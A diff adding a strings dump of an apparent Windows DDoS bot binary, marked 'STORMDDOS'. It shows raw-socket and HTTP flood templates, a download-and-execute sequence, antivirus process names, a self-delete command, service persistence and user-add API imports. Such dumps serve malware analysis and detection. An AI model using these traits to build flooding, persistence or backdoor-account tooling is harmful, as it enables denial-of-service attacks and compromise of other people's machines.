@@ -1,0 +1,347 @@
+!This program cannot be run in DOS mode.
+XRich
+.text
+`.rdata
+@.data
+.idata
+.rsrc
+@.reloc
+hxV4
+9h7(P
+9h7(Q
+SVWh4
+tNj@
+SVWh
+,SVW
+QSVW
+SVWh
+hSVW
+>"u:F
+XPVSS
+[%s]
+REG_SZ
+%-24s %-15s %s 
+REG_EXPAND_SZ
+%-24s %-15s %s 
+REG_DWORD
+%-24s %-15s 0x%x(%d) 
+REG_MULTI_SZ
+%-24s %-15s 
+REG_BINARY
+%-24s %-15s 
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+JyQhIRwkIRs4JGE3IjNta3NrdEM=
+Mnopqr Tuvwxyab Def
+Mnopqr Tuvwxyab Defghijk Mnop
+Mnopqrst Vwxyabcde Ghijklm Opqrstuv Xya
+2017
+%s %s %s
+Referer: http://%s
+Host: %s
+Connection: Close
+Cache-Control: no-cache
+GET %s HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, * / *
+Accept-Language: zh-cn
+Accept-Encoding: gzip, deflate
+User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: %s
+Connection: Keep-Alive
+GET %s HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
+Accept-Language: zh-cn
+Accept-Encoding: gzip, deflate
+User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: %s
+Connection: Keep-Alive
+InitWSAStartup Error!
+sock err!
+opt err!
+time err!
+192.168.1.32
+Send err!
+WSAStartup failed: %d
+WSASocket() failed: %d
+Set IP_HDRINCL Error!
+%d.%d.%d.%d
+OpenSCManagerA
+ADVAPI32.dll
+COMSPEC
+/c del 
+ > nul
+Open
+Network Interface
+Bytes Received/sec
+Bytes Sent/sec
+:%fMB
+LoadLibraryA
+KERNEL32.dll
+wininet.dll
+InternetOpenA
+InternetOpenUrlA
+InternetCloseHandle
+InternetReadFile
+STORMDDOS
+DOWNFAIL
+LoadLibraryA
+KERNEL32.dll
+URLDownloadToFileA
+%s%s
+cmd /c %s
+360tray.exe
+ast.exe
+AST.exe
+SeDebugPrivilege
+CreateMutexA
+KERNEL32.dll
+BITS
+SYSTEM\CurrentControlSet\Services\%s
+%4d-%.2d-%.2d %.2d:%.2d
+InstallTime
+SYSTEM\CurrentCont
+rolSet\Services\
+OpenSCManagerA
+ADVAPI32.dll
+%c%c%c%c%c%c.exe
+SYSTEM\CurrentCont
+rolSet\Services\
+Description
+InstallTime
+Error
+SOFTWARE\Microsoft\Windows NT\CurrentVersion
+ProductName
+2000
+Windows 2000
+Windows XP
+2003
+Windows Server 2003
+Vista
+Windows Vista
+2008
+Windows 2008
+2012
+Windows 2012
+Windows 7
+Windows 8
+Windows NT
+HARDWARE\DESCRIPTION\System\CentralProcessor\0
+~MHz
+%u%s
+.?AVtype_info@@
+HeapFree
+HeapAlloc
+GetProcessHeap
+lstrcatA
+GetTickCount
+Sleep
+ExitThread
+OutputDebugStringA
+lstrcpyA
+CloseHandle
+CreateThread
+GetProcAddress
+LoadLibraryA
+SetThreadPriority
+GetCurrentThread
+GetCurrentProcess
+SetPriorityClass
+GetEnvironmentVariableA
+GetShortPathNameA
+GetModuleFileNameA
+FreeLibrary
+lstrlenA
+ExitProcess
+ReleaseMutex
+OpenMutexA
+WinExec
+GetTempPathA
+MultiByteToWideChar
+TerminateProcess
+OpenProcess
+Process32Next
+Process32First
+CreateToolhelp32Snapshot
+DuplicateHandle
+CreateFileA
+WaitForSingleObject
+GetLastError
+GetLocalTime
+CopyFileA
+GetSystemInfo
+GetSystemDefaultUILanguage
+KERNEL32.dll
+wsprintfA
+USER32.dll
+FreeSid
+RegCloseKey
+RegSetKeySecurity
+SetSecurityDescriptorDacl
+InitializeSecurityDescriptor
+AddAccessAllowedAce
+InitializeAcl
+GetLengthSid
+AllocateAndInitializeSid
+RegOpenKeyExA
+RegEnumValueA
+RegEnumKeyExA
+RegQueryValueExA
+RegDeleteValueA
+RegDeleteKeyA
+RegSetValueExA
+RegCreateKeyExA
+CloseServiceHandle
+DeleteService
+OpenServiceA
+AdjustTokenPrivileges
+LookupPrivilegeValueA
+OpenProcessToken
+SetServiceStatus
+RegisterServiceCtrlHandlerA
+StartServiceCtrlDispatcherA
+RegOpenKeyA
+StartServiceA
+CreateServiceA
+ADVAPI32.dll
+SHChangeNotify
+ShellExecuteExA
+SHELL32.dll
+_except_handler3
+strcat
+strncat
+strchr
+strcpy
+memset
+strlen
+rand
+memcpy
+srand
+time
+printf
+_ftol
+sprintf
+fprintf
+_iob
+_local_unwind2
+realloc
+malloc
+__CxxFrameHandler
+strstr
+atoi
+strncpy
+strcspn
+wcscpy
+strcmp
+??2@YAPAXI@Z
+_CxxThrowException
+strncmp
+??3@YAXPAX@Z
+free
+MSVCRT.dll
+__dllonexit
+_onexit
+??1type_info@@UAE@XZ
+_exit
+_XcptFilter
+exit
+_acmdln
+__getmainargs
+_initterm
+__setusermatherr
+_adjust_fdiv
+__p__commode
+__p__fmode
+__set_app_type
+_controlfp
+WSASocketA
+WSAIoctl
+WS2_32.dll
+SHDeleteKeyA
+SHLWAPI.dll
+NetLocalGroupAddMembers
+NetUserAdd
+NETAPI32.dll
+??0Init@ios_base@std@@QAE@XZ
+??1Init@ios_base@std@@QAE@XZ
+??0_Winit@std@@QAE@XZ
+??1_Winit@std@@QAE@XZ
+?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEPBDXZ
+??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
+??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBDABV?$allocator@D@1@@Z
+??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
+??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAADI@Z
+?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ID@Z
+??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV?$allocator@D@1@@Z
+MSVCP60.dll
+PdhGetFormattedCounterValue
+PdhCollectQueryData
+PdhCloseQuery
+PdhAddCounterA
+PdhOpenQueryA
+PdhEnumObjectItemsA
+pdh.dll
+GetIfTable
+iphlpapi.dll
+GetModuleHandleA
+GetStartupInfoA
+_strnicmp
+HrCg@b	g(
+4,414
+5 5'5E5`5z5
+6"6A6F6
+757^7
+8[8k8u8
+8"949A9
+:H:T:`:m:
+;%;R;_;x;|;
+<*<L<
+=2=U=_=x=|=
+262X2
+3H3[3i3T4a4w4
+4Z5e5
+7!7o7|7
+8&8,8>8H8Q8u8{8
+8,969<9Z9|9
+:%:::l:~:
+='=;=A=h=
+>$>3>H>a>
+?D?V?h?z?
+5H5U5_5
+6D6N6U6i6s6
+7,767c7m7t7y7
+8K8^8l8v8
+9$9*939@9T9Y9f9
+:8:x:
+:);>;Z;p;
+;><N<y<
+>">2>B>R>^>c>o>
+0N0^0
+0&161d1t1
+1(282
+5$5*5a5h5s5
+8"8/8B8O8\8l8r8z8
+9,9h9
+: :x:
+;-;4;R;Y;
+?!?.?C?I?P?]?i?v?
+6E6R6m6
+7'7,72777=7G7Q7_7i7w7
+8-888B8[8e8j8q8x8~8
+8)9/9=9F9K9R9]9c9m9
+:#:,:1:8:G:M:W:`:f:m:z:~:
+;%;S;Z;r;y;~;
+;G<s<
+1!1;1
+2@2[2d2n2
+3 393F3R3k3x3
+404=4I4_4l4x4
+4 5-5:5G5
+8 8&8,82888>8D8J8P8V8\8b8h8n8t8z8
+9"9(9.949:9B9H9N9T9Z9`9f9l9r9x9~9
+9":(:.:4:::@:F:L:T:~:
+;";,;9;K;P;U;b;
+<0<:<@<F<L<R<X<^<d<j<p<v<|<
+=$=*=0=6=<=B=H=
+>6>C>P>]>j>w>
+1,101<1@1`2x2
+4$4,444<4D4L4T4\4d4l4t4|4
+5$5T5t5
